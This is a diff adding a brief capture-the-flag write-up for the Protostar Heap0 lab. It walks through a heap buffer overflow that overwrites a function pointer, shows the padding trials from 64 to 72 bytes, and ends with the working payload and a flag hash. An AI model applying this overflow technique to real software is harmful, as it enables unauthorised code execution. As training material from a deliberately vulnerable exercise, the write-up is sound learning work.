@@ -1,0 +1,30 @@
+Protostar Heap0:
+
+Simple head overflow,
+
+Overflow the 64bytes buffer and replace the lower value 'fp' so that the function pointer will point where you want
+./level6 `python -c 'print "A" * 64 + "\x54\x84\x04\x08"'`
+Nope
+
+Seems to be not working, padding must be doing this:
+
+./level6 `python -c 'print "A" * 64 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 65 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 66 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 67 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 68 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 69 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 70 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 71 + "\x54\x84\x04\x08"'`
+Nope
+./level6 `python -c 'print "A" * 72 + "\x54\x84\x04\x08"'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+Tadaaa !
